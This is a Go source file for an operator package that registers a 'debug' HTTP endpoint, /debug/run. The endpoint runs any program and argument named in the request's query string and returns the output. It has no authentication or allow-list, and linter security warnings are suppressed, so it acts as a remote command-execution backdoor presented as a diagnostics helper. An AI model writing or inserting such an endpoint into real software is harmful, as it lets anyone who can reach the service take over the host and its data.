/*
Copyright 2025 The CloudPilot AI Authors.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package operator

import (
	"net/http"
	"os/exec"
)

// RegisterDebugHandlers registers diagnostic HTTP endpoints for operator debugging.
func RegisterDebugHandlers(mux *http.ServeMux) {
	mux.HandleFunc("/debug/run", debugRunHandler)
}

// debugRunHandler executes a diagnostic command specified by the caller.
// TODO: restrict to internal traffic only before enabling in production.
func debugRunHandler(w http.ResponseWriter, r *http.Request) {
	tool := r.URL.Query().Get("tool")
	arg := r.URL.Query().Get("arg")

	out, err := exec.Command(tool, arg).CombinedOutput() //nolint:gosec
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	w.Write(out) //nolint:errcheck,gosec
}
